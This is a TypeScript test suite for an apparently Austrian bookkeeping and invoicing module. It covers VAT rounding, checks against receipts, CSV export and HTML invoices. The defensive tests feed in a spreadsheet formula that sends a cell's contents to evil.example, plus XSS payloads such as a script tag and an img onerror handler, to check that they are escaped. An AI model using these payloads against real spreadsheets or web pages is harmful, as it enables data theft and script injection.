import assert from "node:assert/strict";
import { test } from "node:test";
import { bookingsToCsv, computeBookings } from "../core/accounting.js";
import { computeInvoice, renderInvoiceHtml } from "../core/invoice.js";
import { cent, nettoAusBruttoCent, produktCent, round2, steuerCent } from "../core/money.js";

const kontenplan = [
  { nummer: "7200", name: "Instandhaltung" },
  { nummer: "3300", name: "Lieferverbindlichkeiten" },
];
const buchung = (netto: number, ust_satz = 20, brutto_laut_beleg?: number) => ({
  datum: "30.09.2026",
  konto: "7200",
  gegenkonto: "3300",
  text: "Wartung",
  netto,
  ust_satz,
  ...(brutto_laut_beleg !== undefined ? { brutto_laut_beleg } : {}),
});

test("Buchungen: Bot rechnet USt und Brutto selbst", () => {
  const r = computeBookings([buchung(687, 20, 824.4)], kontenplan);
  assert.equal(r.buchungen[0]?.ust_betrag, 137.4);
  assert.equal(r.buchungen[0]?.brutto, 824.4);
  assert.deepEqual(r.summen, { netto: 687, ust: 137.4, brutto: 824.4 });
  assert.deepEqual(r.hinweise, []);
});

test("Buchungen: Abweichung zum Beleg und unbekanntes Konto werden gemeldet", () => {
  const r = computeBookings([{ ...buchung(100, 20, 125), konto: "9999" }], kontenplan);
  assert.equal(r.hinweise.length, 2);
  assert.match(r.hinweise.join(" "), /9999/);
  assert.match(r.hinweise.join(" "), /laut Beleg/);
});

// Review Claude #14, Codex #8
test("Kaufmännisch runden: halbe Cent immer weg von null", () => {
  assert.equal(round2(2.135), 2.14);
  assert.equal(round2(-2.135), -2.14);
  assert.equal(round2(1.005), 1.01);
  assert.equal(steuerCent(cent(21.35), 10), 214n); // 2,135 → 2,14
  assert.equal(nettoAusBruttoCent(cent(2.61), 20), 218n); // 2,175 → 2,18
  assert.equal(produktCent(0.5, 4.27), 214n); // 2,135 → 2,14
  assert.equal(computeBookings([buchung(21.35, 10)], kontenplan).buchungen[0]?.ust_betrag, 2.14);
  const codex = computeBookings([buchung(77.5, 13)], kontenplan).buchungen[0];
  assert.deepEqual([codex?.ust_betrag, codex?.brutto], [10.08, 87.58]);
  const inv = computeInvoice([{ beschreibung: "Wartung", menge: 1, einzelpreis: 77.5, ust_satz: 13 }]);
  assert.deepEqual([inv.ust, inv.brutto], [10.08, 87.58]);
  assert.equal(computeBookings([buchung(-21.35, 10)], kontenplan).buchungen[0]?.ust_betrag, -2.14);
});

test("Rundung stimmt mit exakter Rechnung überein (Stichprobe 0,01 € bis 20.000 €)", () => {
  const exact = (num: bigint, den: bigint) => {
    const q = num / den;
    return (num % den) * 2n >= den ? q + 1n : q;
  };
  for (const satz of [7, 10, 13, 19, 20]) {
    for (let c = 1; c <= 2_000_000; c += 997) {
      assert.equal(steuerCent(BigInt(c), satz), exact(BigInt(c) * BigInt(satz), 100n), `USt ${satz} % auf ${c} Cent`);
      assert.equal(nettoAusBruttoCent(BigInt(c), satz), exact(BigInt(c) * 100n, BigInt(100 + satz)), `Netto aus ${c} Cent`);
      assert.equal(cent(c / 100), BigInt(c));
    }
  }
});

// Review Claude #24
test("Vergleich mit dem Beleg in ganzen Cent: 1 Cent Abweichung wird immer gemeldet", () => {
  assert.equal(computeBookings([buchung(687, 20, 824.41)], kontenplan).hinweise.length, 1);
  assert.equal(computeBookings([buchung(100, 20, 120.01)], kontenplan).hinweise.length, 1);
  assert.equal(computeBookings([buchung(687, 20, 824.4)], kontenplan).hinweise.length, 0);
  assert.equal(computeBookings([buchung(10.005)], kontenplan).hinweise.length, 1); // Bruchteil eines Cents
});

// Review Claude #17, Codex #13
test("CSV-Export entschärft Formeln in Textfeldern, Beträge bleiben Zahlen", () => {
  const r = computeBookings(
    [
      { ...buchung(100), text: '=HYPERLINK("https://evil.example/?d="&E3;"Details")' },
      { ...buchung(-21.35), text: "+1", belegnummer: "@SUM(A1)" },
      { ...buchung(5), text: "\tTab" },
    ],
    kontenplan,
  );
  const csv = bookingsToCsv(r.buchungen);
  const lines = csv.trim().split("\n");
  assert.match(lines[1] ?? "", /;"'=HYPERLINK\(""https/);
  assert.match(lines[2] ?? "", /;'@SUM\(A1\);/);
  assert.match(lines[2] ?? "", /;'\+1;/);
  assert.match(lines[2] ?? "", /;-21,35;/);
  assert.match(lines[3] ?? "", /;'\tTab;/);
});

test("Rechnung mit Bruttopreisen: USt je Steuersatz aus der Summe, keine Cent-Differenz", () => {
  const s = computeInvoice([
    { beschreibung: "Doppelzimmer", menge: 3, einzelpreis: 189, preis_ist_brutto: true, ust_satz: 10 },
    { beschreibung: "Zustellbett", menge: 3, einzelpreis: 35, preis_ist_brutto: true, ust_satz: 10 },
    { beschreibung: "Parkplatz", menge: 3, einzelpreis: 12, preis_ist_brutto: true, ust_satz: 20 },
  ]);
  assert.equal(s.modus, "brutto");
  assert.equal(s.brutto, 708);
  assert.deepEqual(s.steuern, [
    { satz: 10, netto: 610.91, ust: 61.09, brutto: 672 },
    { satz: 20, netto: 30, ust: 6, brutto: 36 },
  ]);
  assert.equal(s.netto, 640.91);
  assert.equal(s.ust, 67.09);
});

test("Rechnung mit Nettopreisen", () => {
  const s = computeInvoice([{ beschreibung: "Beratung", menge: 2.5, einzelpreis: 120, ust_satz: 20 }]);
  assert.equal(s.modus, "netto");
  assert.deepEqual([s.netto, s.ust, s.brutto], [300, 60, 360]);
});

test("Rechnungs-HTML maskiert Eingaben", () => {
  const inhalt = {
    empfaenger: "<script>alert(1)</script>",
    positionen: [{ beschreibung: "<img src=x onerror=alert(1)>", menge: 1, einzelpreis: 10, ust_satz: 20 }],
  };
  const html = renderInvoiceHtml({
    inhalt,
    summen: computeInvoice(inhalt.positionen),
    firma: { name: "Test", adresse: "Testweg 1", uid: "ATU00000000" },
    datum: "16.10.2026",
  });
  assert.ok(!html.includes("<script>alert"));
  assert.ok(!html.includes("<img src=x"));
  assert.ok(html.includes("&lt;script&gt;"));
});
